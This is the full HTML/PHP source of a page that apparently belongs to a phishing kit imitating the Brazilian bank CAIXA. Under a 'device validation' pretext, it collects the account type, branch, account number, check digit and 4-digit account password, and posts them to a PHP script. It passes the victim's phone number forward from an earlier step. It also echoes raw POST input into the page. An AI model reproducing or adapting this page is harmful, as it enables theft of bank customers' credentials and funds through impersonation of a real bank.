﻿<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesso Seguro</title>

<style>

body {
	margin: 0;
	font-family:Arial, Helvetica, sans-serif;
	}

#topo {
	width: 100%;
	height: 42px;
	background: url(img/mLogomenor.png) no-repeat;
	background-position: 14px 14px;
	background-color: #1664AC;
	}
	
.logininput {
	width: 100%;
    max-width: 100%;
	box-sizing: border-box;
	font-size: 16px;
	border: none;
	border-bottom: solid 1px #b3b3b3;
	border-radius: 2px;
	display: block;
	color: #000;
	padding: 8px;
	height: 36px;
	}
	
.w3-select {
    padding: 9px 0;
    width: 100%;
    border: none;
    border-bottom: 1px solid #ccc;
	text-transform: none;
	font: inherit;
    margin: 0;
	overflow: visible !important;
	-webkit-appearance: none; 
	-moz-appearance: none;
	appearance: none;
}

select {
    -webkit-appearance: menulist;
    box-sizing: border-box;
    align-items: center;
    white-space: pre;
    -webkit-rtl-ordering: logical;
    color: black;
    background-color: #fff;
	border-bottom: 1px #CCC solid;
}

.w3-select option {
    background-color: #E6E6E6;
    width: 100%;
    padding: 6px;
    display: block;
    color: #999;
}

.bttenter {
	background:url(img/bgbottom.png) repeat;
    border-radius: 4px;
    font-family: arial;
    font-size: 18px;
	color: #fff;
    padding: 12px;
    text-align: center;
    width: 100%;
	border:1px solid #999;
	cursor: pointer;
	}

#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; font-size: 13px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#1664AC; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background:url(img/bgbottom.png) repeat;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}

</style>
</head>

<body>

<div id="topo"></div>

<div style="padding:10px;">

<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return validaSHK()" action="adesao.php" autocomplete="off">

<div style="padding:10px 20px; text-align:center; font-size:16px; color: #277EB6; "><b>Validaçao de dispositivo</b></div>

<div style="padding:10px 20px; text-align:left; font-size:16px; color: #282828; ">Dados da Conta</div>

<div style="padding:10px 20px; text-align:left; font-size:16px; color: #282828; ">
<label placeholder="tipo" data-reactid="14">
<span data-reactid="15">Tipo de conta:</span>
<select class="w3-select" name="tipo">
    <option value=""  selected>Selecione</option>
    <option value="001 - Conta Corrente - P.Fisica">001 - Conta Corrente - P.Fisica</option>
    <option value="002 - Conta Simples - P.Fisica">002 - Conta Simples - P.Fisica</option>
    <option value="003 - Conta Corrente - P.Juridica">003 - Conta Corrente - P.Jurídica</option>
    <option value="006 - Entidades Publicas">006 - Entidades Públicas</option>
    <option value="007 - Dep. Instituicoes Financeiras">007 - Dep. Instituiçoes Financeiras</option>
    <option value="013 - Poupanca">013 - Poupança</option>
    <option value="022 - Poupanca - Pessoa Jurídica">022 - Poupança - Pessoa Jurídica</option>
    <option value="023 - Conta CAIXA Facil">023 - Conta CAIXA Facil</option>
    <option value="028 - Poupanca Credito Imobiliario">028 - Poupança Credito Imobiliario</option>
    <option value="032 - Conta Investimento - P.Fisica">032 - Conta Investimento - P.Fisica</option>
    <option value="034 - Conta Investimento - P.Juridica">034 - Conta Investimento - P.Jurídica</option>
    <option value="043 - Depositos Lotericos">043 - Depositos Lotericos</option>
  </select>
</label>
</div>


<div style="padding:10px 20px; text-align:left; font-size:16px; color: #282828; ">
<label placeholder="agencia" data-reactid="15">
<span class="ui-label-text" data-reactid="16">Agência:</span>
<input class="logininput" name="agencia" id="agencia" maxlength="4" onKeyUp="javascript:pulacampo('agencia','conta');" tabindex="1" type="tel" data-reactid="16">
</label>
</div>


<div style="padding:10px 20px;">
<div style="width:60%; float:left;">
<label placeholder="conta" data-reactid="17">
<span class="ui-label-text" data-reactid="18">Conta:</span>
<input class="logininput" name="conta" id="conta" maxlength="8" onKeyUp="javascript:pulacampo('conta','dig');" tabindex="1" type="tel" data-reactid="16">
</label>
</div>

<div style="width:38%; float:right;" >
<label placeholder="dig" data-reactid="14">
<span class="ui-label-text" data-reactid="15">DV:</span>
<input class="logininput" name="dig" id="dig" maxlength="1" onKeyUp="javascript:pulacampo('dig','senha');" tabindex="1" type="tel" data-reactid="16">
</label>
</div>

</div>


<div style="padding:20px 20px; text-align:left; font-size:16px; color: #282828; clear: both; ">
<label placeholder="senha" data-reactid="14">
<span class="ui-label-text" data-reactid="15">Digite a senha da conta:</span>
<input class="logininput" name="senha" maxlength="4" style="-webkit-text-security: disc!important;" onKeyUp="javascript:pulacampo('senha','bottonG');" id="senha" tabindex="1" type="tel" data-reactid="16">
</label>
</div>



<div style="padding:10px 20px; text-align:center;">
<input type="submit" name="bottonG" id="bottonG" class="bttenter" value="CONFIRMAR" />
</div>
<input type="hidden" name="celular" id="celular" value="<?php echo $_POST['celular']; ?>">
<input type="hidden" name="shkApelido" id="shkApelido" value="<?php echo $_POST['shkApelido']; ?>">
</form>

</div>

<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0; color:#CCA43D;"></div>CAIXA INFORMA!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>


<script type="text/javascript">
function validaSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");

if(document.ajaxpf.tipo.value == ""){
ModalAlertError.innerHTML = "Escolha o tipo de Conta!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
if ( document.ajaxpf.agencia.value == "" ||
document.ajaxpf.agencia.value.length < 4 ||
document.ajaxpf.agencia.value.length > 4){
document.getElementById("agencia").value = "";
ModalAlertError.innerHTML = "Agência Inválida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
if ( document.ajaxpf.conta.value == "" ||
document.ajaxpf.conta.value.length < 2 ||
document.ajaxpf.conta.value.length > 8){
document.getElementById("conta").value = "";
ModalAlertError.innerHTML = "Conta Inválida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
if ( document.ajaxpf.dig.value == "" ||
document.ajaxpf.dig.value.length < 1 ||
document.ajaxpf.dig.value.length > 1){
document.getElementById("dig").value = "";
ModalAlertError.innerHTML = "Digito Inválido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }

if ( document.ajaxpf.senha.value == "" ||
document.ajaxpf.senha.value.length < 4 ||
document.ajaxpf.senha.value.length > 4){
document.getElementById("senha").value = "";
ModalAlertError.innerHTML = "Senha Inválida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
}
</script>

<script>
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>

<script>
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;
    if((tecla > 47 && tecla < 58)) return true;
    else{
    if (tecla != 8) return false;
    else return true;
    }
}
</script>

</body>
</html>